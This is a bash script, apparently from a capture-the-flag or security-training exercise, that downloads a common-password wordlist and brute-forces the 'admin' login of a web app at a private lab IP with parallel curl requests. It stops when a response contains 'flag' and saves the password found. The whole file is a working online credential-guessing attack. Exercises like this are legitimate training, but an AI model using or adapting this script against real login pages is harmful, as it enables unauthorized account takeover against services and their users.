#!/usr/bin/env bash

if [ ! -f wordlist.txt ]; then
	wget https://github.com/danielmiessler/SecLists/raw/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt 
	mv 10-million-password-list-top-100.txt wordlist.txt
fi

function try() {
	local line=$1

	PTDR=$(mktemp)
	curl "${URL_ROOT:-http://10.13.248.94}/?page=signin&username=admin&password=$line&Login=Login#" \
		--compressed -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0' \
		-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
		-H 'Accept-Language: en-US,en;q=0.5' \
		-H 'Accept-Encoding: gzip, deflate' \
		-H 'Connection: close'  > $PTDR 2>/dev/null

	if grep -q "flag" $PTDR; then
		echo "Pass found: $line"
		echo $line > password
	fi
	rm $PTDR
}

# https://stackoverflow.com/a/28776166
sourced=0
if [ -n "$ZSH_VERSION" ]; then 
  case $ZSH_EVAL_CONTEXT in *:file) sourced=1;; esac
elif [ -n "$KSH_VERSION" ]; then
  [ "$(cd -- "$(dirname -- "$0")" && pwd -P)/$(basename -- "$0")" != "$(cd -- "$(dirname -- "${.sh.file}")" && pwd -P)/$(basename -- "${.sh.file}")" ] && sourced=1
elif [ -n "$BASH_VERSION" ]; then
  (return 0 2>/dev/null) && sourced=1 
else # All other shells: examine $0 for known shell binary filenames.
     # Detects `sh` and `dash`; add additional shell filenames as needed.
  case ${0##*/} in sh|-sh|dash|-dash) sourced=1;; esac
fi

if [ $sourced -eq 0 ]; then
	for line in $(cat wordlist.txt); do
		if [ -f password ]; then
			break
		fi
		echo "Trying: $line"
		bash -c "source run.sh; try $line" &
		if [ $(jobs -p | wc -l) -ge 10 ]; then
			sleep 2
		fi
		sleep 0.2
	done
	PASS=$(cat password)
	# jobs -p | xargs -n1 pkill -P
	wait

	echo
	echo "PASS: $PASS"
	echo
fi
